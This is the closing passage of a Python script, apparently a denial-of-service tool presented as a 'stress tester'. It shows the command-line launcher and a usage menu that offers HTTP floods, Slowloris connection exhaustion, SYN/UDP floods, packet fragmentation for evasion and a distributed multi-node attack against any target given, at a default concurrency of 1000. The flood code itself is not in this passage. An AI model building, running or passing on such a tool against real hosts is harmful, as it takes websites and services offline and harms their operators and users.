    )
    
    asyncio.run(tester.run_async_attack())
    
    input(f"\n{Y}Press Enter to return to menu...{W}")

# For direct execution
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
        concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
        attack_type = sys.argv[4] if len(sys.argv) > 4 else 'mixed'
        
        tester = AdvancedAsyncStressTester(
            target=target, 
            duration=duration, 
            concurrency=concurrency,
            attack_type=attack_type
        )
        asyncio.run(tester.run_async_attack())
    else:
        print(f"""{R}
Usage: python stress_tester.py <target> [duration] [concurrency] [attack_type]
        
Attack Types:
  http        - HTTP flood with all methods
  slowloris   - Slowloris connection exhaustion
  mixed       - Combined attacks
  intelligent - Smart attack with protocol detection
  custom      - Custom HTTP methods only
  fragmented  - Packet fragmentation for evasion
  layer4      - Layer 4 attacks (SYN/UDP)
  distributed - Multi-node attack
        
Example: python stress_tester.py http://example.com 60 2000 mixed
        {W}""")